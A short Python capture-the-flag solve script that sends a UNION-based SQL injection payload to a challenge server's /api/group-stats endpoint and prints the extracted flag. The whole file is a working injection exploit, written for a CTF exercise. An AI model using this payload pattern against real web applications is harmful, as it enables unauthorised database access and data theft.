#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

def checker():
    URL = f'https://{DOMAIN}'
    PAYLOAD = "' UNION SELECT flag" + ", null" * 7 + " FROM FLAG; -- -"

    r = requests.post(URL + '/api/group-stats', data={'group' : PAYLOAD})
    print(r.json()['data'][0]['group_id'])
    
if __name__ == '__main__':
    DOMAIN = "euro2024.challs.pascalctf.it"

    checker()